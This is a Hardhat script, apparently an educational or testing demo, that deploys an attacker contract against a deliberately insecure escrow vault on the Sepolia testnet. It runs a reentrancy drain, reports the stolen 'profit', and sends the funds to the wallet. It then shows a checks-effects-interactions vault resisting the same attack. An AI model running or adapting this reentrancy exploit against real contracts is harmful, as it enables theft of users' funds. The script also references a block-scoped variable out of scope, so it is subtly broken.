// Attack existing contracts on Sepolia (deployed by sepolia_proposal.js)
const hre = require("hardhat");
const { ethers } = hre;

async function main() {
  const [wallet] = await ethers.getSigners();
  console.log(`Wallet: ${wallet.address}`);
  console.log(`Balance: ${ethers.formatEther(await ethers.provider.getBalance(wallet.address))} ETH\n`);

  const insecureAddr = "0x33a5ea6A1d427E42cD89C064b5ecae4600117826";
  const secureAddr = "0x6b7C6368A2E8db481159E87bdD1Bf348935a4ea8";

  const insecure = await ethers.getContractAt("InsecureVault", insecureAddr);
  const Attacker = await ethers.getContractFactory("Attacker");

  // Deploy new attacker targeting existing InsecureVault
  const attacker = await Attacker.deploy(insecureAddr);
  await attacker.waitForDeployment();
  const attackerAddr = await attacker.getAddress();
  let r = await attacker.deploymentTransaction().wait();
  console.log(`New Attacker: ${attackerAddr} (${r.gasUsed} gas)\n`);

  // Check vault state
  const vBal = await insecure.getContractBalance();
  console.log(`Vault balance: ${ethers.formatEther(vBal)} ETH`);

  // Check if attacker already has balance
  const existingBal = await insecure.getBalance(attackerAddr);
  console.log(`Existing balance for attacker: ${ethers.formatEther(existingBal)} ETH`);

  if (existingBal === 0n) {
    console.log("\nNo balance for attacker. Setting up new attacker as seller...");
    const fakeSeller = ethers.Wallet.createRandom().address;

    let tx = await insecure.createOrder(fakeSeller);
    await tx.wait();
    tx = await insecure.depositFunds(0, { value: ethers.parseEther("1.5") });
    await tx.wait();
    tx = await insecure.confirmDelivery(0);
    await tx.wait();
    console.log("  Buyer A: 1.5 ETH");

    tx = await insecure.createOrder(fakeSeller);
    await tx.wait();
    tx = await insecure.depositFunds(1, { value: ethers.parseEther("0.8") });
    await tx.wait();
    tx = await insecure.confirmDelivery(1);
    await tx.wait();
    console.log("  Buyer B: 0.8 ETH");

    tx = await insecure.createOrder(attackerAddr);
    await tx.wait();
    tx = await insecure.depositFunds(2, { value: ethers.parseEther("0.1") });
    await tx.wait();
    tx = await insecure.confirmDelivery(2);
    await tx.wait();
    console.log("  Attacker: 0.1 ETH");

    console.log(`\n  Vault now: ${ethers.formatEther(await insecure.getContractBalance())} ETH`);
  }

  // Execute attack
  console.log("\n=== EXECUTING REENTRANCY ATTACK ===");
  const vBefore = await insecure.getContractBalance();
  const aBefore = await ethers.provider.getBalance(attackerAddr);

  console.log(`Vault before: ${ethers.formatEther(vBefore)} ETH`);
  console.log(`Attacker vault balance: ${ethers.formatEther(await insecure.getBalance(attackerAddr))} ETH`);

  try {
    // First try to deposit ETH to attacker contract so it can pay for gas
    const tx0 = await wallet.sendTransaction({
      to: attackerAddr,
      value: ethers.parseEther("0.01")
    });
    await tx0.wait();
    console.log("Sent 0.01 ETH to attacker contract for gas");

    const tx = await attacker.attack({ gasLimit: 500000 });
    r = await tx.wait();
    console.log(`\n  Attack gas: ${r.gasUsed}`);
    console.log(`  Gas price: ${ethers.formatUnits(r.gasPrice, "gwei")} gwei`);

    const reentry = await attacker.getReentrancyCount();
    const vAfter = await insecure.getContractBalance();
    const aAfter = await ethers.provider.getBalance(attackerAddr);
    const legitBal = await insecure.getBalance(fakeSeller || ethers.Wallet.createRandom().address);

    console.log(`\n  Reentrancy loops: ${reentry}`);
    console.log(`  Vault: ${ethers.formatEther(vBefore)} → ${ethers.formatEther(vAfter)} ETH`);
    console.log(`  Attacker ETH: ${ethers.formatEther(aAfter)} ETH`);
    console.log(`  Profit: ${ethers.formatEther(aAfter - ethers.parseEther("0.1"))} ETH`);

    if (aAfter > ethers.parseEther("0.1")) {
      console.log("\n  🔴🔴🔴 ATTACK BERHASIL DI SEPOLIA! 🔴🔴🔴");
      console.log(`  Penyerang mencuri ${ethers.formatEther(aAfter - ethers.parseEther("0.1"))} ETH!`);

      const tx2 = await attacker.collectFunds();
      await tx2.wait();
      console.log("  Dana exfiltrated ke wallet!");
      console.log(`  Wallet: ${ethers.formatEther(await ethers.provider.getBalance(wallet.address))} ETH`);
    } else {
      console.log("\n  🟢 Attack gagal - kontrak aman");
    }
  } catch (err) {
    console.log(`\n  Error: ${err.message.slice(0, 150)}...`);
  }

  // CEI Prevention Test
  console.log("\n=== CEI PREVENTION TEST ===");
  const attacker2 = await Attacker.deploy(secureAddr);
  await attacker2.waitForDeployment();
  const a2Addr = await attacker2.getAddress();
  r = await attacker2.deploymentTransaction().wait();
  console.log(`Attacker2 (targets SecureVault): ${a2Addr}`);

  const secure = await ethers.getContractAt("SecureVault", secureAddr);
  const fakeSeller2 = ethers.Wallet.createRandom().address;

  let tx = await secure.createOrder(fakeSeller2);
  await tx.wait();
  tx = await secure.depositFunds(0, { value: ethers.parseEther("1.5") });
  await tx.wait();
  tx = await secure.confirmDelivery(0);
  await tx.wait();
  console.log("  Buyer: 1.5 ETH deposited");

  tx = await secure.createOrder(a2Addr);
  await tx.wait();
  tx = await secure.depositFunds(1, { value: ethers.parseEther("0.1") });
  await tx.wait();
  tx = await secure.confirmDelivery(1);
  await tx.wait();
  console.log("  Attacker: 0.1 ETH deposited (as seller)");

  try {
    tx = await attacker2.attack({ gasLimit: 500000 });
    r = await tx.wait();
    console.log(`  ⚠️ Attack on SecureVault used ${r.gasUsed} gas`);
  } catch (err) {
    console.log("  ✅ CEI Pattern MENCEGAH reentrancy! Aman.");
  }

  console.log("\nDone.");
}

main().catch(console.error);
